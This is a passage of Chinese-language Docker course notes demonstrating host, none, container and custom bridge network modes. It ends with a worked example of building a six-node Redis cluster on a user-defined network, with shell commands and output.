[root@ubuntu1804 ~]#ss -ntlp|grep :80
LISTEN   0         128                 0.0.0.0:80               0.0.0.0:*       
users:(("nginx",pid=43762,fd=6),("nginx",pid=43737,fd=6))


#进入容器
[root@ubuntu1804 ~]#docker exec -it web1 bash



#进入容器后仍显示宿主机的主机名提示符信息
[root@ubuntu1804 /]# hostname
ubuntu1804.magedu.org
[root@ubuntu1804 /]# ifconfig 
docker0: flags=4099<UP,BROADCAST,MULTICAST> mtu 1500
       inet 172.17.0.1 netmask 255.255.0.0 broadcast 172.17.255.255
       inet6 fe80::42:2ff:fe7f:a8c6 prefixlen 64 scopeid 0x20<link>
       ether 02:42:02:7f:a8:c6 txqueuelen 0 (Ethernet)
       RX packets 63072 bytes 152573158 (145.5 MiB)
       RX errors 0 dropped 0 overruns 0 frame 0
       TX packets 56611 bytes 310696704 (296.3 MiB)
       TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500
       inet 10.0.0.100 netmask 255.255.255.0 broadcast 10.0.0.255
       inet6 fe80::20c:29ff:fe34:df91 prefixlen 64 scopeid 0x20<link>
       ether 00:0c:29:34:df:91 txqueuelen 1000 (Ethernet)
       RX packets 2028984 bytes 1200589212 (1.1 GiB)
       RX errors 0 dropped 0 overruns 0 frame 0
       TX packets 7272137 bytes 11576960933 (10.7 GiB)
       TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0
lo: flags=73<UP,LOOPBACK,RUNNING> mtu 65536
       inet 127.0.0.1 netmask 255.0.0.0
       inet6 ::1 prefixlen 128 scopeid 0x10<host>
       loop txqueuelen 1000 (Local Loopback)
       RX packets 3533 bytes 320128 (312.6 KiB)
       RX errors 0 dropped 0 overruns 0 frame 0
       TX packets 3533 bytes 320128 (312.6 KiB)
       TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0
       
       
[root@ubuntu1804 /]# route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref   Use Iface
0.0.0.0         10.0.0.2        0.0.0.0         UG    0      0        0 eth0
10.0.0.0        0.0.0.0         255.255.255.0   U     0      0        0 eth0
172.17.0.0      0.0.0.0         255.255.0.0     U     0      0        0 docker0


#从容器访问远程主机
[root@ubuntu1804 /]# curl 10.0.0.7
Website on 10.0.0.7


#查看远程主机的访问日志
[root@centos7 ~]#tail -n1 /var/log/httpd/access_log 
10.0.0.100 - - [01/Feb/2020:19:58:06 +0800] "GET / HTTP/1.1" 200 20 "-"
"curl/7.29.0"


#远程主机可以访问容器的web服务
[root@centos7 ~]#curl 10.0.0.100/app/
Test Page in app
```

###### 48.8.3.4.2 host模式下端口映射无法实现

```
[root@ubuntu1804 ~]#ss -ntl|grep :81
[root@ubuntu1804 ~]#docker run -d --network host --name web2 -p 81:80 nginx-centos7-base:1.6.1
WARNING: Published ports are discarded when using host network mode
6b6a910d79d94b188f719bc6ad00c274acd76a4a2929212157cd49b5219d44ae


[root@ubuntu1804 ~]#docker ps -a
CONTAINER ID       IMAGE                     COMMAND                 CREATED 
            STATUS                     PORTS               NAMES
6b6a910d79d9       nginx-centos7-base:1.6.1   "/apps/nginx/sbin/ng…"   6
seconds ago       Exited (1) 2 seconds ago                       web2
b27c0fd28b40       nginx-centos7-base:1.6.1   "/apps/nginx/sbin/ng…"   About a 
minute ago   Up About a minute                             web1
```

###### 48.8.3.4.3 对比host模式和bridge模式端口映射

```
[root@ubuntu1804 ~]#docker port web1
[root@ubuntu1804 ~]#docker port web2
[root@ubuntu1804 ~]#docker run -d --network bridge -p 8001:80 --name web3 nginx-centos7-base:1.6.1
4095372b9a561704eac98ccef8041a80a2cdc2aa7b57d2798dec1a8dcb00c377
[root@ubuntu1804 ~]#docker port web3
80/tcp -> 0.0.0.0:8001
```

##### 48.8.3.5 none模式(了解)

```
在使用none模式后，Docker容器不会进行任何网络配置，没有网卡、没有IP也没有路由，因此默认无法与外界通信，需要手动添加网卡配置IP等，所以极少使用。
```

###### 48.8.3.5.1 none模式特点

```
1）使用参数 --network none 指定
2）默认无网络功能，无法和外部通信
```

###### 48.8.3.5.2 启动none模式的容器

```
[root@ubuntu1804 ~]#docker run -d --network none -p 8001:80 --name web1-none nginx-centos7-base:1.6.1
5207dcbd0aeea88548819267d3751135e337035475cf3cd63a5e1be6599c0208


[root@ubuntu1804 ~]#docker ps 
CONTAINER ID       IMAGE                     COMMAND                 CREATED 
            STATUS             PORTS               NAMES
5207dcbd0aee       nginx-centos7-base:1.6.1   "/apps/nginx/sbin/ng…"   About a 
minute ago   Up About a minute    
web1-none


[root@ubuntu1804 ~]#docker port web1-none
[root@ubuntu1804 ~]#docker exec -it web1-none bash
[root@5207dcbd0aee /]# ifconfig -a
lo: flags=73<UP,LOOPBACK,RUNNING> mtu 65536
       inet 127.0.0.1 netmask 255.0.0.0
       loop txqueuelen 1000 (Local Loopback)
       RX packets 0 bytes 0 (0.0 B)
       RX errors 0 dropped 0 overruns 0 frame 0
       TX packets 0 bytes 0 (0.0 B)
       TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0
       
       
[root@5207dcbd0aee /]# route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref   Use Iface
[root@5207dcbd0aee /]# netstat -ntl
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
[root@5207dcbd0aee /]# ping www.baidu.com
ping: www.baidu.com: Name or service not known
[root@5207dcbd0aee /]# ping 172.17.0.1
connect: Network is unreachable
```

##### 48.8.3.6 Container模式

![1660136849666](linux体系.assets/1660136849666.png)

**类似于数据卷容器的思想**

![1660136873505](linux体系.assets/1660136873505.png)

```
使用此模式创建的容器需指定和一个已经存在的容器共享一个网络，而不是和宿主机共享网，新创建的容器不会创建自己的网卡也不会配置自己的IP，而是和一个被指定的已经存在的容器共享IP和端口范围，因此这个容器的端口不能和被指定容器的端口冲突，除了网络之外的文件系统、进程信息等仍然保持相互隔离，两个容器的进程可以通过lo网卡进行通信。
```

###### 48.8.3.6.1 Container模式特点

```
1）使用参数 –-network container:名称或ID指定
2）与宿主机网络空间隔离
3）空器间共享网络空间
4）适合频繁的容器间的网络通信
5）直接使用对方的网络，较少使用
```

**范例:**

```
#创建第一个容器
[root@ubuntu1804 ~]#docker run -it --name server1 -p 80:80 alpine:3.11 sh
/ # ifconfig
eth0     Link encap:Ethernet HWaddr 02:42:AC:11:00:02  
         inet addr:172.17.0.2 Bcast:172.17.255.255 Mask:255.255.0.0
         UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1
         RX packets:9 errors:0 dropped:0 overruns:0 frame:0
         TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
         collisions:0 txqueuelen:0 
         RX bytes:766 (766.0 B) TX bytes:0 (0.0 B)
lo       Link encap:Local Loopback  
         inet addr:127.0.0.1 Mask:255.0.0.0
         UP LOOPBACK RUNNING MTU:65536 Metric:1
         RX packets:0 errors:0 dropped:0 overruns:0 frame:0
         TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
         collisions:0 txqueuelen:1000 
         RX bytes:0 (0.0 B) TX bytes:0 (0.0 B)
         
/ # netstat -ntl
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State  


#在另一个终端执行下面操作
[root@ubuntu1804 ~]#docker ps 
CONTAINER ID       IMAGE               COMMAND             CREATED             
STATUS             PORTS               NAMES
4d342fac169f       alpine:3.11         "sh"                29 seconds ago     
Up 28 seconds       0.0.0.0:80->80/tcp   server1
[root@ubuntu1804 ~]#docker port server1
80/tcp -> 0.0.0.0:80


#无法访问web服务
[root@ubuntu1804 ~]#curl 127.0.0.1/app/
curl: (52) Empty reply from server


#创建第二个容器，基于第一个容器的container的网络模式
[root@ubuntu1804 ~]#docker run -d --name server2 --network container:server1 
nginx-centos7-base:1.6.1
7db90f38590ade11e1c833a8b2175810c71b3f222753c5177bb8b05952f08a7b #可以访问web服务
[root@ubuntu1804 ~]#curl 127.0.0.1/app/
Test Page in app
[root@ubuntu1804 ~]#docker exec -it server2 bash


#和第一个容器共享相同的网络
[root@4d342fac169f /]# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500
       inet 172.17.0.2 netmask 255.255.0.0 broadcast 172.17.255.255
       ether 02:42:ac:11:00:02 txqueuelen 0 (Ethernet)
       RX packets 29 bytes 2231 (2.1 KiB)
       RX errors 0 dropped 0 overruns 0 frame 0
       TX packets 12 bytes 1366 (1.3 KiB)
       TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0
lo: flags=73<UP,LOOPBACK,RUNNING> mtu 65536
       inet 127.0.0.1 netmask 255.0.0.0
       loop txqueuelen 1000 (Local Loopback)
       RX packets 10 bytes 860 (860.0 B)
       RX errors 0 dropped 0 overruns 0 frame 0
       TX packets 10 bytes 860 (860.0 B)
       TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0
       
       
[root@4d342fac169f /]# netstat -ntl
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN  


#可访问外网
[root@4d342fac169f /]# ping www.baidu.com
PING www.a.shifen.com (61.135.169.121) 56(84) bytes of data.
64 bytes from 61.135.169.121 (61.135.169.121): icmp_seq=1 ttl=127 time=3.99 ms
64 bytes from 61.135.169.121 (61.135.169.121): icmp_seq=2 ttl=127 time=5.03 ms
^C
--- www.a.shifen.com ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 3.999/4.514/5.030/0.519 ms
```

###### 48.8.3.6.2 第一个容器使用host网络模式,第二个容器与之共享网络

```
[root@ubuntu1804 ~]#docker run -d --name c1 --network host nginx-centos7.8:v5.0-1.18.0
5a60804f3917d82dfe32db140411cf475f20acce0fe4674d94e4557e1003d8e0
[root@ubuntu1804 ~]#docker run -it --name c2 --network container:c1 centos7.8:v1.0
[root@ubuntu1804 /]# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group 
default qlen 1000
   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
   inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
   inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP 
group default qlen 1000
   link/ether 00:0c:29:63:8b:ac brd ff:ff:ff:ff:ff:ff
   inet 10.0.0.100/24 brd 10.0.0.255 scope global eth0
       valid_lft forever preferred_lft forever
   inet6 fe80::20c:29ff:fe63:8bac/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state 
DOWN group default 
   link/ether 02:42:24:86:98:fb brd ff:ff:ff:ff:ff:ff
   inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
   inet6 fe80::42:24ff:fe86:98fb/64 scope link 
       valid_lft forever preferred_lft forever
       
       
[root@ubuntu1804 ~]#docker exec -it c1 bash
[root@ubuntu1804 /]# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group 
default qlen 1000
   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
   inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
   inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP 
group default qlen 1000
   link/ether 00:0c:29:63:8b:ac brd ff:ff:ff:ff:ff:ff
   inet 10.0.0.100/24 brd 10.0.0.255 scope global eth0
       valid_lft forever preferred_lft forever
   inet6 fe80::20c:29ff:fe63:8bac/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state 
DOWN group default 
   link/ether 02:42:24:86:98:fb brd ff:ff:ff:ff:ff:ff
   inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
   inet6 fe80::42:24ff:fe86:98fb/64 scope link 
       valid_lft forever preferred_lft forever
```

###### 48.8.3.6.3 第一个容器使用none网络模式,第二个容器与之共享网络

```
[root@ubuntu1804 ~]#docker run -d --name c1 --network none nginx-centos7.8:v5.0-1.18.0
caf5b57299c8359f21f30b8894c5f8496ff39b44ead6a732056000689cb0c91c
[root@ubuntu1804 ~]#docker run -it --name c2 --network container:c1 centos7.8:v1.0
[root@caf5b57299c8 /]# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group 
default qlen 1000
   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
   inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
```

##### 48.8.3.7 自定义网络模式

```
除了以上的网络模式，也可以自定义网络，使用自定义的网段地址，网关等信息。

注意: 自定义网络内的容器可以直接通过容器名进行相互的访问,而无需使用 --link

可以使用自定义网络模式,实现不同集群应用的独立网络管理,而互不影响,而且在网一个网络内,可以直接利用容器名相互访问非常便利。
```

###### 48.8.3.7.1 自定义网络实现 

```
[root@centos7 ~]# docker network --help

Usage:	docker network COMMAND

Manage networks

Commands:
  connect     Connect a container to a network
  create      Create a network
  disconnect  Disconnect a container from a network
  inspect     Display detailed information on one or more networks
  ls          List networks
  prune       Remove all unused networks
  rm          Remove one or more networks

Run 'docker network COMMAND --help' for more information on a command.
```

**创建自定义网络:** 

```
docker network create -d <mode> --subnet <CIDR> --gateway <网关> <自定义网络名称> 

#注意mode不支持host和none
```

**查看自定义网络信息**

```
docker network inspect <自定义网络名称或网络ID>
```

**引用自定议网络**

```
docker run --network <自定义网络名称> <镜像名称>
```

**删除自定义网络**

```
doccker network rm <自定义网络名称或网络ID>
```

###### 48.8.3.7.2 实战案例: 自定义网络

**创建自定义的网络**

```
[root@centos7 ~]# docker network create -d bridge --subnet 172.27.0.0/16 --gateway 172.27.0.1 test-net
41508a1e5f832b70d234ac98f4f40215353e26fc00c584a53bc0c9df62c9a986


[root@centos7 ~]# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:90:b9:33 brd ff:ff:ff:ff:ff:ff
    inet 10.0.0.77/24 brd 10.0.0.255 scope global noprefixroute eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::20c:29ff:fe90:b933/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:a6:33:20:10 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:a6ff:fe33:2010/64 scope link 
       valid_lft forever preferred_lft forever
#新添加了一个虚拟网卡
18: br-41508a1e5f83: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:2a:c4:05:ab brd ff:ff:ff:ff:ff:ff
    inet 172.27.0.1/16 brd 172.27.255.255 scope global br-41508a1e5f83
       valid_lft forever preferred_lft forever



[root@centos7 ~]# docker inspect test-net
[
    {
        "Name": "test-net",
        "Id": "41508a1e5f832b70d234ac98f4f40215353e26fc00c584a53bc0c9df62c9a986",
        "Created": "2022-08-10T21:36:58.206327051+08:00",
        "Scope": "local",
        "Driver": "bridge",
        "EnableIPv6": false,
        "IPAM": {
            "Driver": "default",
            "Options": {},
            "Config": [
                {
                    "Subnet": "172.27.0.0/16",
                    "Gateway": "172.27.0.1"
                }
            ]
        },
        "Internal": false,
        "Attachable": false,
        "Ingress": false,
        "ConfigFrom": {
            "Network": ""
        },
        "ConfigOnly": false,
        "Containers": {},
        "Options": {},
        "Labels": {}
    }
]



#新加了一个网桥
[root@centos7 ~]# yum -y install bridge-utils
[root@centos7 ~]# brctl show
bridge name	bridge id		STP enabled	interfaces
br-41508a1e5f83		8000.02422ac405ab	no		
docker0		8000.0242a6332010	no	



[root@centos7 ~]# route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         10.0.0.2        0.0.0.0         UG    100    0        0 eth0
10.0.0.0        0.0.0.0         255.255.255.0   U     100    0        0 eth0
172.17.0.0      0.0.0.0         255.255.0.0     U     0      0        0 docker0
172.27.0.0      0.0.0.0         255.255.0.0     U     0      0        0 br-41508a1e5f83
```

**利用自定义的网络创建容器**

```
[root@ubuntu1804 ~]#docker run -it --rm --network test-net alpine sh
/ # ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
   inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
15: eth0@if16: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue 
state UP 
   link/ether 02:42:ac:1b:00:02 brd ff:ff:ff:ff:ff:ff
   #在172.27.0.0/16自定义的网段中！！
   inet 172.27.0.2/16 brd 172.27.255.255 scope global eth0
       valid_lft forever preferred_lft forever
/ # / # route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref   Use Iface
0.0.0.0         172.27.0.1      0.0.0.0         UG    0      0        0 eth0
172.27.0.0      0.0.0.0         255.255.0.0     U     0      0        0 eth0

/ # cat /etc/resolv.conf 
search magedu.com magedu.org
nameserver 127.0.0.11
options ndots:0

/ # ping -c1 www.baidu.com
PING www.baidu.com (111.206.223.172): 56 data bytes
64 bytes from 111.206.223.172: seq=0 ttl=127 time=5.053 ms



#再开一个新终端窗口查看网络
[root@ubuntu1804 ~]#docker inspect test-net 
[
   {
        "Name": "test-net",
        "Id": 
"00ab0f2d29e82d387755e1bea19532dc279fa134a565e496d308ec62f7edf434",
        "Created": "2020-07-22T09:59:09.431393706+08:00",
        "Scope": "local",
        "Driver": "bridge",
        "EnableIPv6": false,
        "IPAM": {
            "Driver": "default",
            "Options": {},
            "Config": [
               {
                    "Subnet": "172.27.0.0/16",
                    "Gateway": "172.27.0.1"
               }
           ]
       },
        "Internal": false,
        "Attachable": false,
        "Ingress": false,
        "ConfigFrom": {
            "Network": ""
       },
        "ConfigOnly": false,
        #出现此网络中容器的网络信息
        "Containers": {
            "89e54ed71c111ac7b41a62ce20191707cf53a3a234ba3e25ac11c1a4a6bed7ef": 
{
                "Name": "frosty_ellis",
                "EndpointID": 
"cf72bf192df73a8b290d8b18dd8507fef64a1f9480d4d65f74c23258d20dbafb",
                "MacAddress": "02:42:ac:1b:00:02",
                "IPv4Address": "172.27.0.2/16",
                "IPv6Address": ""
           }
       },
        "Options": {},
        "Labels": {}
   }
]
```

###### 48.8.3.7.3 自定义网络中的容器之间利用容器名通信

```
[root@ubuntu1804 ~]#docker network ls
NETWORK ID         NAME               DRIVER             SCOPE
c2f770f19400       bridge             bridge             local
220d4008a6a0       host               host               local
adb6f338ff6d       none               null               local
00ab0f2d29e8       test-net           bridge             local



[root@ubuntu1804 ~]#docker run -it --rm --network test-net --name test1 alpine sh
/ # ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
   inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
23: eth0@if24: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue 
state UP 
   link/ether 02:42:ac:1b:00:02 brd ff:ff:ff:ff:ff:ff
   inet 172.27.0.2/16 brd 172.27.255.255 scope global eth0
       valid_lft forever preferred_lft forever
       
/ # cat /etc/hosts
127.0.0.1 localhost
::1 localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.27.0.2 c3446876a38b



#等后面步骤中容器test2创建好可以再访问
/ # ping -c1 test2 
PING test2 (172.27.0.3): 56 data bytes
64 bytes from 172.27.0.3: seq=0 ttl=64 time=0.072 ms
--- test2 ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max = 0.072/0.072/0.072 ms


[root@ubuntu1804 ~]#docker run -it --rm --network test-net --name test2 alpine 
/ # ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
   inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
25: eth0@if26: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue 
state UP 
   link/ether 02:42:ac:1b:00:03 brd ff:ff:ff:ff:ff:ff
   inet 172.27.0.3/16 brd 172.27.255.255 scope global eth0
       valid_lft forever preferred_lft forever
/ # cat /etc/hosts
127.0.0.1 localhost
::1 localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.27.0.3 305fd14a4b70


/ # ping -c1 test1 
PING test1 (172.27.0.2): 56 data bytes
64 bytes from 172.27.0.2: seq=0 ttl=64 time=0.074 ms
--- test1 ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max = 0.074/0.074/0.074 ms
```

**结论: 自定义网络中的容器之间可以直接利用容器名进行通信**

###### 48.8.3.7.4 利用自定义网络实现 Redis Cluster

![1660140048395](linux体系.assets/1660140048395.png)

**创建自定义网络**

```
[root@ubuntu1804 ~]#docker network create net-redis --subnet 172.18.0.0/16
09b9dded99787835dccc029e16fa2782292d22c3e258f60a1db15d44e7a3bd93
[root@ubuntu1804 ~]#docker inspect net-redis
[
   {
        "Name": "net-redis",
        "Id": 
"09b9dded99787835dccc029e16fa2782292d22c3e258f60a1db15d44e7a3bd93",
        "Created": "2020-07-22T14:16:43.295465692+08:00",
        "Scope": "local",
        "Driver": "bridge",
        "EnableIPv6": false,
        "IPAM": {
            "Driver": "default",
             "Options": {},
            "Config": [
               {
                    "Subnet": "172.18.0.0/16"
               }
           ]
       },
        "Internal": false,
        "Attachable": false,
        "Ingress": false,
        "ConfigFrom": {
            "Network": ""
       },
        "ConfigOnly": false,
        "Containers": {},
        "Options": {},
        "Labels": {}
   }
]
```

**创建6个redis容器配置**

```
# 通过脚本创建六个redis容器配置
[root@ubuntu1804 ~]#for port in {1..6};do 
 mkdir -p /data/redis/node-${port}/conf
 cat >> /data/redis/node-${port}/conf/redis.conf << EOF
port 6379
bind 0.0.0.0
masterauth 123456
requirepass 123456
cluster-enabled yes
cluster-config-file nodes.conf
cluster-node-timeout 5000
cluster-announce-ip 172.18.0.1${port}
cluster-announce-port 6379
cluster-announce-bus-port 16379
appendonly yes
EOF
done



[root@ubuntu1804 ~]#tree /data/redis/
/data/redis/
├── node-1
│   └── conf
│       └── redis.conf
├── node-2
│   └── conf
│       └── redis.conf
├── node-3
│   └── conf
│       └── redis.conf
├── node-4
│   └── conf
│       └── redis.conf
├── node-5
│   └── conf
│       └── redis.conf
└── node-6
   └── conf
       └── redis.conf
       
       
12 directories, 6 files
[root@ubuntu1804 ~]#cat /data/redis/node-1/conf/redis.conf 
port 6379
bind 0.0.0.0
masterauth 123456
requirepass 123456
cluster-enabled yes
cluster-config-file nodes.conf
cluster-node-timeout 5000
cluster-announce-ip 172.18.0.11
cluster-announce-port 6379
cluster-announce-bus-port 16379
appendonly yes
```

**创建6个 redis 容器**

```
# 通过脚本运行六个redis容器
[root@ubuntu1804 ~]#for port in {1..6};do
 docker run -p 637${port}:6379 -p 1667${port}:16379 --name redis-${port} \
 -v /data/redis/node-${port}/data:/data \
 -v /data/redis/node-${port}/conf/redis.conf:/etc/redis/redis.conf \
 -d --net net-redis --ip 172.18.0.1${port} redis:5.0.9-alpine3.11 redisserver /etc/redis/redis.conf
done



[root@ubuntu1804 ~]#docker ps 
CONTAINER ID       IMAGE                   COMMAND                 CREATED   
          STATUS             PORTS                                             
NAMES
2525235efae6       redis:5.0.9-alpine3.11   "docker-entrypoint.s…"   23 seconds 
ago     Up 21 seconds       0.0.0.0:6376->6379/tcp, 0.0.0.0:16676->16379/tcp   
redis-6
bd89dbb445ae       redis:5.0.9-alpine3.11   "docker-entrypoint.s…"   24 seconds 
ago     Up 22 seconds       0.0.0.0:6375->6379/tcp, 0.0.0.0:16675->16379/tcp   
redis-5
51cb6244d34d       redis:5.0.9-alpine3.11   "docker-entrypoint.s…"   26 seconds 
ago     Up 23 seconds       0.0.0.0:6374->6379/tcp, 0.0.0.0:16674->16379/tcp   
redis-4
1a49a47eb72d       redis:5.0.9-alpine3.11   "docker-entrypoint.s…"   27 seconds 
ago     Up 25 seconds       0.0.0.0:6373->6379/tcp, 0.0.0.0:16673->16379/tcp   
redis-3
a03e957680f0       redis:5.0.9-alpine3.11   "docker-entrypoint.s…"   28 seconds 
ago     Up 26 seconds       0.0.0.0:6372->6379/tcp, 0.0.0.0:16672->16379/tcp   
redis-2
b5332c0cba81       redis:5.0.9-alpine3.11   "docker-entrypoint.s…"   31 seconds 
ago     Up 28 seconds       0.0.0.0:6371->6379/tcp, 0.0.0.0:16671->16379/tcp   
redis-1
```

**创建 redis cluster**

```
#连接redis cluster
[root@ubuntu1804 ~]#docker exec -it redis-1 /bin/sh
/data # redis-cli -a 123456
Warning: Using a password with '-a' or '-u' option on the command line interface 
may not be safe.
127.0.0.1:6379> exit
#不支持 { } 扩展
/data # echo {1..10}
{1..10}
/data # echo $-
smi



# 创建集群
/data # redis-cli -a 123456 --cluster create 172.18.0.11:6379 172.18.0.12:6379 172.18.0.13:6379 172.18.0.14:6379 172.18.0.15:6379 172.18.0.16:6379 --cluster-replicas 1
Warning: Using a password with '-a' or '-u' option on the command line interface 
may not be safe.
>>> Performing hash slots allocation on 6 nodes...
Master[0] -> Slots 0 - 5460
Master[1] -> Slots 5461 - 10922
Master[2] -> Slots 10923 - 16383
Adding replica 172.18.0.15:6379 to 172.18.0.11:6379
Adding replica 172.18.0.16:6379 to 172.18.0.12:6379
Adding replica 172.18.0.14:6379 to 172.18.0.13:6379
M: 0f9bd0d24495f826702a030703896f7690bebdee 172.18.0.11:6379
   slots:[0-5460] (5461 slots) master
M: 9b6ab0b8f75516d6acd9d566d0d349f1fdd29540 172.18.0.12:6379
   slots:[5461-10922] (5462 slots) master
M: 599f69b43a3579ec064b1854680c77997c809470 172.18.0.13:6379
   slots:[10923-16383] (5461 slots) master
S: c64dfd1bd6c964a3c6425a28f6ab0f0e1bcea1ba 172.18.0.14:6379
   replicates 599f69b43a3579ec064b1854680c77997c809470
S: 2f69287f52ec7243a0b894491814d2afe28a46d2 172.18.0.15:6379
   replicates 0f9bd0d24495f826702a030703896f7690bebdee
S: 06295ce4884948858cf60243629a595afa461b21 172.18.0.16:6379
   replicates 9b6ab0b8f75516d6acd9d566d0d349f1fdd29540
Can I set the above configuration? (type 'yes' to accept): #输入yes
>>> Nodes configuration updated
>>> Assign a different config epoch to each node
>>> Sending CLUSTER MEET messages to join the cluster
Waiting for the cluster to join
....
>>> Performing Cluster Check (using node 172.18.0.11:6379)
M: 0f9bd0d24495f826702a030703896f7690bebdee 172.18.0.11:6379
   slots:[0-5460] (5461 slots) master
   1 additional replica(s)
S: 2f69287f52ec7243a0b894491814d2afe28a46d2 172.18.0.15:6379
   slots: (0 slots) slave
   replicates 0f9bd0d24495f826702a030703896f7690bebdee
S: c64dfd1bd6c964a3c6425a28f6ab0f0e1bcea1ba 172.18.0.14:6379
   slots: (0 slots) slave
   replicates 599f69b43a3579ec064b1854680c77997c809470
M: 9b6ab0b8f75516d6acd9d566d0d349f1fdd29540 172.18.0.12:6379
   slots:[5461-10922] (5462 slots) master
   1 additional replica(s)
M: 599f69b43a3579ec064b1854680c77997c809470 172.18.0.13:6379
   slots:[10923-16383] (5461 slots) master
   1 additional replica(s)
S: 06295ce4884948858cf60243629a595afa461b21 172.18.0.16:6379
   slots: (0 slots) slave
   replicates 9b6ab0b8f75516d6acd9d566d0d349f1fdd29540
[OK] All nodes agree about slots configuration.
>>> Check for open slots...
>>> Check slots coverage...
[OK] All 16384 slots covered.   
```

**测试访问 redis cluster**

```
#连接redis cluster
/data # redis-cli -a 123456 -c
Warning: Using a password with '-a' or '-u' option on the command line interface 
may not be safe.
127.0.0.1:6379> cluster info
cluster_state:ok
cluster_slots_assigned:16384
cluster_slots_ok:16384
cluster_slots_pfail:0
cluster_slots_fail:0
cluster_known_nodes:6
cluster_size:3
cluster_current_epoch:6
cluster_my_epoch:1
cluster_stats_messages_ping_sent:267
cluster_stats_messages_pong_sent:278
cluster_stats_messages_sent:545
cluster_stats_messages_ping_received:273
cluster_stats_messages_pong_received:267
cluster_stats_messages_meet_received:5
cluster_stats_messages_received:545


127.0.0.1:6379> cluster nodes
#看到172.18.0.{11,12,13}为master,172.18.0.{14,15,16}为slave
#以下为master/slave关系
#172.18.0.11<--->172.18.0.15
#172.18.0.12<--->172.18.0.16
